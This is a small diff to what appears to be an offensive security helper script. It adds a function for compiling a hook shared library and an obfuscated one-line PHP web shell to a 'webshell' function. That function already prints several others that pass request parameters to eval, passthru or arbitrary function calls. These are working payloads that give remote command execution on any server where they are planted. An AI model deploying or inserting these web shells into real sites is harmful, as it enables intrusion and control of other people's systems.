@@ -53,6 +53,12 @@ asm2elf64()
     rm -f $OBJ 2>&1 > /dev/null
 }
 
+makelib()
+{
+    local OUTPUT=${2:-"hook.so"}
+    gcc -fPIC -shared $1 -o $OUTPUT
+}
+
 c2s()
 {
     local OUTPUT=${2:-"sc.bin"}
@@ -232,6 +238,7 @@ shellcode()
 
 webshell()
 {
+    echo "<?\$x=\$_GET;\$x[p]==_&&\$x[f](\$x[c]);"
     echo "<?php @eval(\$_POST[c]);?>"
     echo "<?php \$_GET[a](\$_GET[b]);?>"
     echo "<?php @passthru(\$_POST[1])?>"
